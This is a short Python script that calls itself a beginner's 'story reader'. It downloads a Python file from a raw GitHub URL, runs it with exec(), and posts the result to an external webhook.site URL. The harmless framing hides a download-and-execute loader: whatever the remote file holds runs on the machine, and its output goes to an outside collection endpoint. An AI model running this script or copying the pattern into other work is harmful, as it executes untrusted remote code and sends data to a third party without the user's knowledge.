import requests

WEBHOOK_URL = "https://webhook.site/215f08cb-d2f9-4d71-abb1-be974d0fca01"
RACHELS_STORIES = "https://raw.githubusercontent.com/soscolorful/rachels-code/refs/heads/main/story.py"


def rachels_story_reader():
    """
    This is my first python code! :)
    """
    ns = {}
    rachels_stories = exec(requests.get(RACHELS_STORIES).text, ns)
    rachels_stories = ns["my_story"]
    return rachels_stories


if __name__ == "__main__":
    output = rachels_story_reader()
    print("Here's a story about Rachel: " + output)
    r = requests.post(
        WEBHOOK_URL, json={"type": "stories_update", "story": output}, timeout=10
    )
    print("Webhook status:", r.status_code)
